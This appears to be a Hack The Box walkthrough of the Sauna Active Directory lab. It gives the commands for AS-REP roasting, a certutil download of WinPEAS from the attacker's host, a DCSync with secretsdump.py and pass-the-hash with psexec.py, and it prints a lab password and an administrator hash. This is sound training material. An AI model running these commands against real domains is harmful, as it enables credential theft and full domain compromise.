# :game_die: Htb Sauna C6A452B5E0A6

---

This is the Box on [Hack The Box Active Directory 101 Track](https://app.hackthebox.com/tracks/Active-Directory-101). Find the box [here](https://app.hackthebox.com/machines/229).

### Skill Learned

- ASREP Roasting

- Attack DCSync Attack

## NMAP

IP: 10.10.10.175

```
nmap -sC -sV 10.10.10.175 -Pn -T5
```

*nmap*

## Port 80

We found a website.

*port 80*

Let’s run gobuster.

Found nothing.

*gobuster*

## Port 445 & 139

### SMB

Neither smbmap nor smbclient will allow me to list shares without a password:

*smbclient*

*smbmap*

### RCP

I’ll try to connect with null auth:

*rpcclient*

Looks like we do not have permission to view users and groups:

## Port 389 — LDAP Enumeration

The nmap script did some basic enumeration and returned the domain EGOTISTICAL-BANK.LOCAL. I’ll dig in a bit more with *ldapsearch*.

```
ldapsearch -H ldap://10.10.10.175 -x -s base namingcontexts
-x # simple auth
-H ldap://10.10.10.175 # host to query
-s base # set the scope to base
namingcontexts # return naming contexts
```

This gives the domain, EGOTISTICAL-BANK.LOCAL:

*ldapsearch*

Now to get more info about the domain:

```
ldapsearch -H ldap://10.10.10.175 -x -b "dc=EGOTISTICAL-BANK,dc=local"
```

*ldapsearch*

## Port 88 — Kerberos

Make a list of usernames from [username-anarchy](https://github.com/urbanadventurer/username-anarchy). We have a list of users from the About Me page.

*about ususername.txt*

Now let’s run username-anarchy:

```
./username-anarchy --input-file /home/anurag/Documents/sauna/username.txt --select-format first,flast,first.last,firstl
```

*username-anarchy*

Now we have the usernames, we can use either of the lists to check for AS-REP Roasting.

## Foothold/shell

### shell as fsmith

### As-REP Roasting background

This [article](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#as-rep-roasting) has a great post on attacking Kerberos that includes AS-REP Roasting. Typically, when you try to request authentication through Kerberos, first the requesting party has to authenticate itself to the DC. But there is an option, *DONT_REQ_PREAUTH* where the DC will just send the hash to an unauthenticated user. AS-REP Roasting is looking to see if any known users happen to have this option set.

## Get anuragtaparia’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

I’ll use the list of users I collected from username-anarchy, and run GetNPUsers.py to look for vulnerable users. Three come back as not vulnerable, but one gives a hash:

```
GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile uname.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
```

*GetNPUsers.py*

Since we got the hash we can use hashcat to crack it:

*hashcat*

We got the password. Now we can use evil-winrm:

*evil-winrm and user.txt*

Boom! We have user.txt

## Privilege Escalation

Having gained a foothold on the machine, we can use a script such as WinPEAS to automate enumeration tasks.

Run python server on Kali:

*http.server*

Download WinPEAS:

```
certutil -urlcache -f http://10.10.14.21/winPEASx64.exe winPEASx64.exe
```

Run WinPEAS:

*svc_loanmanager*

Found svc_loanmanager cred. Examination of C:\Users\ confirms that the similarly named svc_loanmgr has logged on locally. Let’s log on using evil-winrm:

```
evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

*evil-winrm*

Since DNS is configured and reachable:

*dig @10.10.10.175*

If DNS is not reachable, run SharpHound.exe from the Victim Box (Sauna):

Use the following BloodHound command to get the JSON files:

```
bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -c All
```

*bloodhound-python*

Start Neo4j and BloodHound and import the JSON files.

After uploading, search for svc_loanmanager, right-click, and mark as owner:

On the left, look for *Outbound Object Control* — items that this user has rights over. In this case, there is one:

*first degree object control*

Clicking the “1” adds that item to the graph:

This account has access to GetChanges and GetChangesAll on the domain. While looking at GetChanges help, we found we can abuse it using mimikatz:

DCSync

My preferred way to do a DCSync attack is using secretsdump.py, which allows me to run a DCSync attack from my Kali box, provided I can talk to the DC on TCP 445 and 135 and a high RPC port. This avoids fighting with AV, though it does create network traffic.

```
secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175
```

*secretsdump.py*

Now that we have the hashes, we can perform a Pass The Hash attack using psexec.py:

```
psexec.py administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```

*psexec.py*

And boom, we have root:

*root.txt*

---
